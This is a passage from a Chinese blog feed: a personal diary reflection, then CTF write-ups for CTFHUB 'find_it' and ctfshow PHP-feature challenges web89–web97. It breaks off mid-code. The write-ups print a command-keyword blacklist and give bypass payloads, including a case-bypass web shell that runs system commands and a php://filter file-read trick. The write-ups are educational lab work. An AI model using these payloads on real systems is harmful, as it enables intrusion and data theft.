    <content type="html"><![CDATA[<p><img src="/images/%E6%B3%A2%E5%A5%87_4.png" alt="波奇"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近写日志的频率有点低呢，是不是三分钟热度到期了啊~</p><h1 id="一句话"><a href="#一句话" class="headerlink" title="一句话"></a>一句话</h1><p>而世之奇伟、瑰怪，非常之观，常在于险远，而人之所罕至焉，故非有志者不能至也。有志矣，不随以止也，然力不足者，亦不能至也。有志与力，而又不随以怠，至于幽暗昏惑而无物以相之，亦不能至也。<br>--游褒禅山记</p><h1 id="关于隐私"><a href="#关于隐私" class="headerlink" title="关于隐私"></a>关于隐私</h1><p>最近意识到自己隐私的问题欸。可能有感而发，不小心说些现实中的话，尽管只是个小小博客，有心人也能搜集到许多信息吧。<br>由是如此，我想自己要少说些现实中的话，如果实在想说就说得抽象些，懂得人自然明白。还有就是尽量多写自己思考的东西，少写些日常。想想初中时写了一整年日记，当初以为自己会怀念往昔，有些事情写得十分详实，如今也不再看。<br>或许等我再老些时才会厚古薄今吧…</p><h1 id="名言与思考"><a href="#名言与思考" class="headerlink" title="名言与思考"></a>名言与思考</h1><p>所谓名言，在我看来就是将具有哲理意义的话精炼出来。<br>前段时间有人对我说过大概是这样的话：“你只会引用别人的话，自己不会思考。”<br>其实这样说还真引起了我一点小小的思考。平时写日志也是，常常引用一些经典的话语。<br>虽说被人这么说了，我也并不认为引用别人的话就是不会思考。为什么呢？因为既然是名言，那么在某种程度上必然有些道理且是达到高度精炼的，当我的想法恰好与某句名言的想要表达的意思相同时，能有更好的表达，我为什么不用呢？非要拐弯抹角用自己的话再换词造句吗？我想这并不是思考的体现，不过是浪费时间罢了。如同已有轮子了，还要模仿一遍自造轮子。<br>叔本华说：“阅读只是独自思考的代替物。阅读时，一个人本身的思想是在被别人的思想牵引管束。”<br>多年前看到叔本华这么说，我还并不理解，甚至鄙夷。随着阅历的增长，我也慢慢理解了叔本华这样说的原因。的确，凡是能体现思考的书籍，其实都是作者思考后形成的思想，而读者是重新体会了一遍作者思考的过程，就阅读这个过程而言，并不是独立思考。而我们阅读思想书籍的根本目的，并非是掌握思想，而是启发自身思考，强化独立思考能力，成为精神上的君主。<br>而其中高度提炼的句子，就是思考的结晶了。倘若不去阅读思考的过程（书籍），不去亲自思考，只是一昧偏好于这类思考的结晶，最终会如同地基不稳的高楼，只要有风就会摇摇欲坠。当看到两个“自相矛盾”的名言时，是该信哪一个呢？我想无论怎么选都是错的吧。<br>所以说，引用别人的话不代表不会思考，思考也没有捷径可走。</p><h1 id="古今思考"><a href="#古今思考" class="headerlink" title="古今思考"></a>古今思考</h1><p>上面那个话题说着说着来了兴致，又开了一个话题。<br>古代人的思考感觉比现代人都更加深刻，明明现代人接受的信息更加庞大，很多方面却不如古代人。我想正是因为现代人接受信息过于庞大，反而没有精力去思考吧。社会这台庞大的机器在精密运转，它推着人们去工作，去交际，去处理琐事，去娱乐等等。但没有让人思考。灯红酒绿眼花缭乱，思考似乎就被抛掷脑后了。这大概是为什么21世纪没有一个举世闻名的哲学家吧。</p><h1 id="爱的软弱"><a href="#爱的软弱" class="headerlink" title="爱的软弱"></a>爱的软弱</h1><p>今日看漫画时看到了这样一句话：<br>人会为了爱一个人而变得脆弱，但不用为此羞愧，因为这不是真正的软弱。<br>这让我一下子就理解了为什么有些男人会“怕老婆”。我自认为这是一句有道理的话，尽管有所体会，却无法搞清原因。<br>不过啊，在现代社会，这同时也会变得非常麻烦。因为所爱之人无法与己交心的话，往往会演变成一种糟糕的情形，那就是招致对方的反感与轻视。而己方也有可能变化为一种病态的心理。比如现代社会流行的“舔狗”，我想大概是由于爱的软弱演变为病态的心理吧。<br>在这样一个时代，不再是诗歌《从前慢》里所写的那样“车，马，邮件都慢  一生只够爱一个人”。<br>于成年人而言，都是先看别人突出点再斟酌合不合得来。“行就处，不行拉倒”恐怕才是常态吧。<br>想到这，不禁有些感伤呢。也许，某个人对另一人表现出的软弱，实际上是爱的体现呢。可那人能否察觉到这份软弱是爱意并为之珍惜，恐怕要另当别论了。</p><p>想了这么多，可是这和我有什么关系呢？我可真是个笨蛋。</p><h1 id="公信力"><a href="#公信力" class="headerlink" title="公信力"></a>公信力</h1><p>公信力或可信度，包括来源或讯息可信度的客观和主观成分。<br>前段时间有个频道发起了一个讨论，谈论自己认为目前什么具有最大公信力。<br>我随手给出的答案居然得到了广泛认同：广泛流传的小道消息。<br>这也侧面反映出某些方面的糟糕吧。（很晚了，不能再说了）</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>啊，写了整整一个小时，早睡计划泡汤了。明天要好好学习。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/%E6%B3%A2%E5%A5%87_4.png&quot; alt=&quot;波奇&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>CTFHUB-find_it</title>
    <link href="http://example.com/2022/12/15/CTFHUB-find_it/"/>
    <id>http://example.com/2022/12/15/CTFHUB-find_it/</id>
    <published>2022-12-14T16:00:00.000Z</published>
    <updated>2022-12-15T05:25:06.662Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>需要自己的后台扫描工具，手工尝试太慢了…</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>扫描<br>首先拿DirBuster扫描工具扫一下，发现robots.txt<br>访问robots.txt文件，发现了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">When I was a child,I also like to read Robots.txt</span><br><span class="line"></span><br><span class="line">Here is what you want: 1ndexx.php</span><br></pre></td></tr></table></figure><p>但是当我们访问时却失败，于是用工具扫一下缓存<br>得到:1ndexx.php.swp访问成功</p></li><li><p>分析尝试<br>进入后呈现了一堆代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$link</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;ctfhub&#x27;</span>, <span class="string">&#x27;ctfhub&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Hello worldd!&lt;/title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">body &#123;</span><br><span class="line">background-color: white;</span><br><span class="line">text-align: center;</span><br><span class="line">padding: <span class="number">50</span>px;</span><br><span class="line">font-family: <span class="string">&quot;Open Sans&quot;</span>,<span class="string">&quot;Helvetica Neue&quot;</span>,Helvetica,Arial,sans-serif;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#logo &#123;</span></span><br><span class="line">margin-bottom: <span class="number">40</span>px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;img id=<span class="string">&quot;logo&quot;</span> src=<span class="string">&quot;logo.png&quot;</span> /&gt;</span><br><span class="line">&lt;h1&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;Hello My freind!&quot;</span>; <span class="meta">?&gt;</span>&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(<span class="variable">$link</span>) &#123; <span class="meta">?&gt;</span></span><br><span class="line">&lt;h2&gt;I Can<span class="string">&#x27;t view my php files?!&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;?php &#125; else &#123; ?&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;?php &#125; ?&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#Really easy...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$file=fopen(&quot;flag.php&quot;,&quot;r&quot;) or die(&quot;Unable 2 open!&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(&quot;flag.php&quot;));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$hack=fopen(&quot;hack.php&quot;,&quot;w&quot;) or die(&quot;Unable 2 open&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$a=$_GET[&#x27;</span>code<span class="string">&#x27;];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if(preg_match(&#x27;</span>/system|<span class="keyword">eval</span>|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|<span class="function"><span class="keyword">function</span>|<span class="title">call</span>|\~|\^|\`|<span class="title">flag</span>|<span class="title">cat</span>|<span class="title">tac</span>|<span class="title">more</span>|<span class="title">tail</span>|<span class="title">echo</span>|<span class="title">require</span>|<span class="title">include</span>|<span class="title">proc</span>|<span class="title">open</span>|<span class="title">read</span>|<span class="title">shell</span>|<span class="title">file</span>|<span class="title">put</span>|<span class="title">get</span>|<span class="title">contents</span>|<span class="title">dir</span>|<span class="title">link</span>|<span class="title">dl</span>|<span class="title">var</span>|<span class="title">dump</span>/&#x27;,$<span class="title">a</span>))</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;you die&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>)&gt;<span class="number">33</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;nonono.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$hack</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$hack</span>,<span class="variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$hack</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们看到里面有get型传参code，并且设置了严格的过滤，以及字符长度小于34。<br>传参的code可以写入hack文件。而且flag就在hack文件中<br>当我们直接尝试访问时却无法访问hack.php，这是文件被隐藏了。<br>因为可以写入33个字符的代码，于是我们可以思考写入一段显示hack文件源码的代码。</p></li><li><p>破解<br>以下有三种方法：</p></li></ol><ul><li><p><strong>直接写入 phpinfo()</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>得到flag</p></li><li><p><strong>show_source()</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=&lt;?php show_source(__FILE__);?&gt;</span><br></pre></td></tr></table></figure><p>之后便可直接访问hack.php<br>得到flag</p></li><li><p><strong>System()</strong><br>代码中preg_match并没有忽略大小写，而php函数是可以忽略大小写的，所以可以使用System()来绕过正则检查</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=&lt;?php System($_GET[1]);?&gt;</span><br></pre></td></tr></table></figure><p>之后直接执行命令即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/hack.php?1=ls -alh &amp;&amp; cat flag.php</span><br></pre></td></tr></table></figure></li></ul><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>学会分析源码，才知道应该做什么。</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.wolai.com/ctfhub/oKTHZCKnTRgZzifYg5twqZ">代码中preg</a><br><a href="https://blog.csdn.net/qq_46266956/article/details/124377403">CTFHUB find_it</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;需要自己的后台扫描工具，手工尝试太慢了…&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="PHP" scheme="http://example.com/categories/CTF/PHP/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-web入门-php特性</title>
    <link href="http://example.com/2022/12/15/ctfshow-web%E5%85%A5%E9%97%A8-php%E7%89%B9%E6%80%A7/"/>
    <id>http://example.com/2022/12/15/ctfshow-web%E5%85%A5%E9%97%A8-php%E7%89%B9%E6%80%A7/</id>
    <published>2022-12-14T16:00:00.000Z</published>
    <updated>2022-12-28T04:53:51.398Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>为了继续巩固php基础！</p><span id="more"></span><h1 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>首先include包含了flag.php，然后通过get方式传入num参数。</li></ol><ul><li><p>preg_match()函数：<br>执行匹配正则表达式。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$pattern</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$subject</span>,</span><br><span class="line">    <span class="keyword">array</span> &amp;<span class="variable">$matches</span> = <span class="literal">null</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span></span><br><span class="line">): <span class="keyword">int</span>|<span class="literal">false</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pattern</span></span><br><span class="line"><span class="comment">要搜索的模式，字符串类型。</span></span><br><span class="line"><span class="comment">subject</span></span><br><span class="line"><span class="comment">输入字符串。</span></span><br><span class="line"><span class="comment">matches</span></span><br><span class="line"><span class="comment">如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。</span></span><br><span class="line"><span class="comment">flags</span></span><br><span class="line"><span class="comment">flags 可以被设置为以下标记值的组合：</span></span><br><span class="line"><span class="comment">PREG_OFFSET_CAPTURE</span></span><br><span class="line"><span class="comment">如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的字节数)。 注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串subject中的偏移量。</span></span><br><span class="line"><span class="comment">PREG_UNMATCHED_AS_NULL</span></span><br><span class="line"><span class="comment">使用该标记，未匹配的子组会报告为 null；未使用时，报告为空的 string。</span></span><br><span class="line"><span class="comment">offset</span></span><br><span class="line"><span class="comment">通常，搜索从目标字符串的开始位置开始。可选参数 offset 用于 指定从目标字符串的某个位置开始搜索(单位是字节)。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回值</span></span><br><span class="line"><span class="comment">如果 pattern 匹配到指定 subject，则 preg_match() 返回 1，如果没有匹配到则返回 0， 或者在失败时返回 false。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li><li><p>intval()函数<br>获取变量的整数值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">intval(mixed $value, int $base = 10): int</span><br><span class="line">通过使用指定的进制 base 转换（默认是十进制），返回变量 value 的 int 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</span><br><span class="line">注意:</span><br><span class="line">如果 base 是 0，通过检测 value 的格式来决定使用的进制：</span><br><span class="line">如果字符串包括了 &quot;0x&quot; (或 &quot;0X&quot;) 的前缀，使用 16 进制 (hex)；否则，</span><br><span class="line">如果字符串以 &quot;0&quot; 开始，使用 8 进制(octal)；否则，</span><br><span class="line">将使用 10 进制 (decimal)。</span><br></pre></td></tr></table></figure></li></ul><ol start="2"><li>构造语句<br>因为preg_match在匹配字符串不为“字符串”时，会提示错误，返回false。因此我们可以传入一个数组。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num[]=a</span><br></pre></td></tr></table></figure>拿到flag</li></ol><h1 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>分析源码可知，条件为num变量的10进制值为4476时不能通过，但又要求:<br><code>intval($num,0)===4476</code><br>根据上面的知识点可知，当base为0时检测value的前缀。<br>那么我们可以更改为十进制以外的前缀，并且让其10进制值为4476，便可通过。</p></li><li><p>构造语句<br><code>?num=0x117c</code><br>拿到flag</p></li></ol><h1 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>知识点总结：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">^  匹配开头</span><br><span class="line">$匹配末尾</span><br><span class="line">/i  不区分大小写</span><br><span class="line">/m 多行匹配</span><br></pre></td></tr></table></figure>多行匹配（不匹配换行符）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">^xxx$</span><br><span class="line">^yyy$</span><br><span class="line">^zzz$</span><br></pre></td></tr></table></figure>单行匹配（匹配换行符）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">^xxx</span><br><span class="line">yyy</span><br><span class="line">zzz$</span><br></pre></td></tr></table></figure></li></ol><p>第1个if语句是多行匹配，第2个if语句是单行匹配。</p><ol start="2"><li>构造语句<br>通过使用换行符，可以让换行符后为php，换行符前为其它字符。能成功绕过2个if语句。<br>于是可以得到：<br><code>?cmd=a%0aphp</code><br>拿到flag<br>该题原型为一个<a href="https://blog.csdn.net/qq_46091464/article/details/108278486">解析漏洞</a></li></ol><h1 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h1><p>和web90题差不多，区别在于从&#x3D;&#x3D;&#x3D;变成了&#x3D;&#x3D;，&#x3D;&#x3D;会进行弱类型转换<br>解决方法很多，比如0x117c, 4476.1, 4476e123<br>我的： <code>?num=0x117c</code><br>拿到flag</p><h1 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h1><p>和web92题类似，只不过不能用字符了，所以16进制和科学计数法不能使用，但可以通过8进制或小数点绕过<br>我的： <code>?num=4476.1</code><br>拿到flag</p><h1 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h1><p>和web93题类似，这一次把浮点数4476.1和八进制010574都过滤了，我们仔细看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目中增加的条件是：num参数中必须包含0，但不能在首位，于是我们可以在八进制前添加一个空格绕过：<br><code>?num= 010574</code><br>或者将数字0添加到小数点后：<br><code>?num=4476.01</code><br>均可拿到flag</p><h1 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h1><p>这一题和web94差不多，只不过把小数点过滤了，不能使用浮点数，但可以在八进制前面加上空格之类的绕过<br><code>?num= 010574</code><br>拿到flag</p><h1 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h1><p>看到highlight_file()函数，想到文件包含<br>所以直接构造文件包含的语句：<br><code>?u=php://filter/convert.base64-encode/resource=flag.php</code><br>得到的数据经过base64解码即可拿到flag<br>或者使用相对路径： <code>?u=./flag.php</code><br>或者使用绝对路径： <code>?u=/var/www/html/flag.php</code><br>均可拿到flag</p><h1 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span 